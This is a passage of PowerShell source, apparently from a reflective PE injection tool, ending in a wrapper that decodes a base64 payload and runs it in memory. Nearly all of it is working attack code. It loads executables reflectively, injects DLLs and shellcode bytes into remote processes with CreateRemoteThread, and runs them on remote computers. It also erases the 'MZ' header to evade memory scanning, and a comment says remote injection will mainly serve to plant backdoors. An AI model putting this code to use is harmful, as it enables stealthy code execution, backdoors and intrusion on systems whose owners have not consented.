        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            # This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
# if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
# {
# Write-Verbose "Getting SeDebugPrivilege"
# Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
# }
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    
    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }
    
    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}

 
# Convert base64 string to byte array
 
$PEBytes = [System.Convert]::FromBase64String($InputString)
 
# Run EXE in memory
 
Invoke-ReflectivePEInjection -PEBytes $PEBytes #-ExeArgs "Arg1 Arg2 Arg3 Arg4"
}

